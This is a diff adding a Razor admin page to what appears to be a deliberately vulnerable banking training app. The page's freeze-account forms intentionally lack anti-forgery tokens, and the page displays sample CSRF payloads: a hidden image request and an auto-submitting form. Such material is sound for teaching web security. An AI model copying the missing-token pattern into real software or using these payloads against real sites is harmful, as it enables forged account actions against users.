@@ -1,0 +1,59 @@
+@{
+    ViewData["Title"] = "Admin Panel";
+    Layout = "~/Views/Shared/_Layout.cshtml";
+    var allAccounts = ViewBag.AllAccounts as List<SecureBankingApp.Models.BankAccount> ?? new();
+}
+
+<h4>Admin Panel <span class="badge bg-danger">CSRF Vulnerable</span></h4>
+
+<div class="alert alert-danger">
+    <strong>CSRF-004:</strong> All admin actions below lack anti-forgery token protection.
+    An attacker can freeze accounts, adjust balances, or perform other admin actions via CSRF.
+</div>
+
+<div class="card mb-4">
+    <div class="card-header bg-dark text-white"><strong>All Bank Accounts</strong></div>
+    <div class="card-body p-0">
+        <table class="table table-sm table-hover mb-0">
+            <thead class="table-light">
+                <tr><th>Account #</th><th>Owner</th><th>Type</th><th>Balance</th><th>Active</th><th>Actions</th></tr>
+            </thead>
+            <tbody>
+                @foreach (var acct in allAccounts)
+                {
+                    <tr>
+                        <td class="font-monospace">@acct.AccountNumber</td>
+                        <td>@(acct.User?.FullName ?? "Unknown")</td>
+                        <td>@acct.AccountType</td>
+                        <td>@acct.Balance.ToString("C")</td>
+                        <td><span class="badge @(acct.IsActive ? "bg-success" : "bg-danger")">@(acct.IsActive ? "Active" : "Frozen")</span></td>
+                        <td>
+                            <!-- VULNERABLE: No anti-forgery token on these actions -->
+                            <form asp-action="FreezeAccount" method="post" class="d-inline">
+                                <input type="hidden" name="accountId" value="@acct.AccountNumber"/>
+                                <button type="submit" class="btn btn-sm btn-danger">Freeze</button>
+                            </form>
+                        </td>
+                    </tr>
+                }
+            </tbody>
+        </table>
+    </div>
+</div>
+
+<!-- CSRF Attack Demo for Admin -->
+<div class="card border-danger">
+    <div class="card-header bg-danger text-white"><strong>CSRF Attack Vectors for Admin</strong></div>
+    <div class="card-body">
+        <p class="small">These image tags can be embedded in any page to trigger admin actions (no JavaScript needed):</p>
+        <pre class="small">&lt;!-- Freeze account via GET-based CSRF (if endpoint accepts GET) --&gt;
+&lt;img src="http://bank/Admin/FreezeAccount?accountId=USER001" width="0" height="0"&gt;
+
+&lt;!-- For POST endpoints, use a hidden form that auto-submits --&gt;
+&lt;form action="http://bank/Admin/FreezeAccount" method="POST"&gt;
+  &lt;input type="hidden" name="accountId" value="USER001"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
+        <a href="/csrf-demo.html" target="_blank" class="btn btn-outline-danger btn-sm">Open Full CSRF Demo</a>
+    </div>
+</div>
